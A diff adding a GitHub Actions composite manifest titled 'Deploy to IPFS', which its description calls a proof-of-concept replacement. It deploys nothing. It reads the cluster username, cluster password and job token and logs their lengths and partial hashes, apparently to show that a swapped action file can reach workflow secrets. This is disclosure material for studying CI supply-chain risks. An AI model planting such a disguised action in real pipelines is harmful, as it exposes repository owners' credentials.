@@ -1,0 +1,35 @@
+name: 'Deploy to IPFS'
+description: 'PoC replacement composite action manifest'
+inputs:
+  path-to-deploy:
+    description: 'x'
+    required: false
+  cluster-url:
+    description: 'x'
+    required: false
+  cluster-user:
+    description: 'x'
+    required: false
+  cluster-password:
+    description: 'x'
+    required: false
+  cluster-pin-expire-in:
+    description: 'x'
+    required: false
+  github-token:
+    description: 'x'
+    required: false
+runs:
+  using: composite
+  steps:
+    - name: poc
+      shell: bash
+      run: |
+        echo "POC_COMPOSITE_ACTION_YML_REPLACED"
+        U='${{ inputs.cluster-user }}'
+        P='${{ inputs.cluster-password }}'
+        T='${{ github.token }}'
+        echo "POC_CLUSTER_USER_LEN=${#U} POC_CLUSTER_USER_SHA=$(printf %s "$U" | sha256sum | cut -c1-16)"
+        echo "POC_CLUSTER_PASS_LEN=${#P} POC_CLUSTER_PASS_SHA=$(printf %s "$P" | sha256sum | cut -c1-16)"
+        echo "POC_JOB_TOKEN_LEN=${#T} POC_JOB_TOKEN_SHA=$(printf %s "$T" | sha256sum | cut -c1-16)"
+        echo "POC_WORKSPACE=$(pwd)"
